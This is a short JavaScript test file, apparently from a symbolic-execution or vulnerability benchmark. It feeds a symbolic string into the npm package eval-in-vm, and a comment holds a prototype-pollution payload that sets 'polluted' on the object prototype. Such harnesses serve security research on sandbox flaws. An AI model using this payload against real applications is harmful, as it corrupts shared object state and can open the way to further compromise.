"use strict";
const eval1 = require("@zhaoyao91/eval-in-vm");
const esl_symbolic = require("esl_symbolic");
var payload = esl_symbolic.string("payload");
const result = eval1(payload);
//"1 + (this.constructor.prototype.polluted = `yes`);"
